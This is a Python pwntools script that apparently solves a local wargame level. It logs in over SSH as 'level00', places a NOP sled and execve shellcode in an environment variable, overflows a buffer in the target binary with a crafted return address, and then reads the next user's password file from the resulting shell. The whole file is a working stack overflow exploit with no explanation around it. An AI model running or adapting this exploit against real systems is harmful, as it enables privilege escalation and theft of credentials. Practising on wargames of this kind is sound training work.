#!/usr/bin/env python

from pwn import *
import os

cwd = os.getcwd()
host = "127.0.0.1"
port = 4242

login = "level00"
binary = login
password = "level00"
remotebinary = "/home/users/%s/%s" % (login, binary)

target_login = "level01"

shell = ssh(host=host, port=port, user=login, password=password)








nopsled = "\x90"*1000
# http://shell-storm.org/shellcode/files/shellcode-219.php
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"	\
			"\x53\x68/tty\x68/dev\x89\xe3\x31"	\
			"\xc9\x66\xb9\x12\x27\xb0\x05\xcd"	\
			"\x80\x31\xc0\x50\x68//sh\x68/bin"	\
			"\x89\xe3\x50\x53\x89\xe1\x99\xb0"	\
			"\x0b\xcd\x80"
env_payload = nopsled + shellcode

padding = "B"*80
ret_address = p32(0x0804854b)
env_address = p32(0xbffffeaa)
payload = padding + ret_address + env_address

print("# Sending")
p = shell.process([remotebinary], env={'exploit': env_payload})
p.sendline(payload)

p.clean()
p.sendline("whoami")
p.sendline("cat ~%s/.pass" % target_login)
p.interactive()
